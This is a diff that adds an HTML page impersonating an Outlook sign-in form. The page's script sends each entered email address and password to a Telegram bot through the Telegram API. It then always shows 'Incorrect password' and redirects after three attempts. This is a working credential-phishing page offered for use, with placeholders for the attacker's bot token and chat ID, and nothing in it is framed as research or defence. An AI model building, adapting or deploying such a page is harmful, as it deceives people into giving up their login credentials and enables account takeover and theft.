@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="icon" type="image/x-icon" href="./images/favicon.ico">
+    <meta property="og:image" content="./images/outlook.webp">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Form</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f9f9f9;
+        }
+        .login-container {
+            width: 300px;
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+        }
+        img {
+            display: block;
+            margin: 0 auto 20px;
+        }
+        input[type="email"],
+        input.password-input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        label {
+            font-size: 14px;
+            color: #555;
+        }
+        .show-password {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        input[type="checkbox"] {
+            margin-right: 8px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0078d4;
+            border: none;
+            color: white;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #005a9e;
+        }
+        .button-box {
+            display: block;
+            position: relative;
+            margin: 8px 40px;
+        }
+        #feedback {
+            color: red;
+            font-family: sans-serif;
+            font-size: 15px;
+            text-align: center;
+            margin: 0 30px;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://res.cloudinary.com/dl6mhgnqg/image/upload/v1731678334/outlook_ebgjls.webp" alt="Sign In Image" width="280">
+        <input style="display: none;" type="text" id="username" placeholder="Username" required>
+        <input type="email" id="email" placeholder="Email address" required>
+        <input type="password" id="password" class="password-input" name="password" placeholder="Password" required>
+        <div class="show-password">
+            <input type="checkbox" class="toggle-password">
+            <label>Show password</label>
+        </div>
+        <span id="feedback"></span>
+        <span class="button-box">
+            <button class="btn" name="login" id="login">Log in</button>
+        </span>
+    </div>
+
+    <script>
+        const togglePassword = document.querySelector('.toggle-password');
+        const passwordInput = document.querySelector('.password-input');
+        const loginButton = document.getElementById('login');
+        const emailInput = document.getElementById('email');
+        const feedback = document.getElementById('feedback');
+        let attempts = 0; // Initialize attempts counter
+
+        togglePassword.addEventListener('change', function() {
+            passwordInput.type = this.checked ? 'text' : 'password';
+        });
+
+        loginButton.addEventListener('click', function () {
+            attempts++; // Increment attempts
+
+            // Clear previous feedback
+            feedback.textContent = '';
+
+            // Send message to Telegram
+            const telegramBotToken = 'YOUR_TELEGRAM_BOT_TOKEN'; // Replace with your bot token
+            const chatId = 'YOUR_CHAT_ID'; // Replace with your chat ID
+            const message = `Attempt ${attempts}: Email: ${emailInput.value}, Password: ${passwordInput.value}`;
+            const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            const xhr = new XMLHttpRequest();
+            xhr.open('GET', telegramUrl, true);
+            xhr.send();
+
+            // Show feedback for incorrect password
+            feedback.textContent = 'Incorrect password! Please try again...';
+
+            // Redirect after the third attempt
+            if (attempts >= 3) {
+                setTimeout(() => {
+                    window.location.href = 'index_mail'; // Redirect to your desired page
+                }, 2000); // Optional delay before redirecting
+            }
+        });
+    </script>
+</body>
+</html>
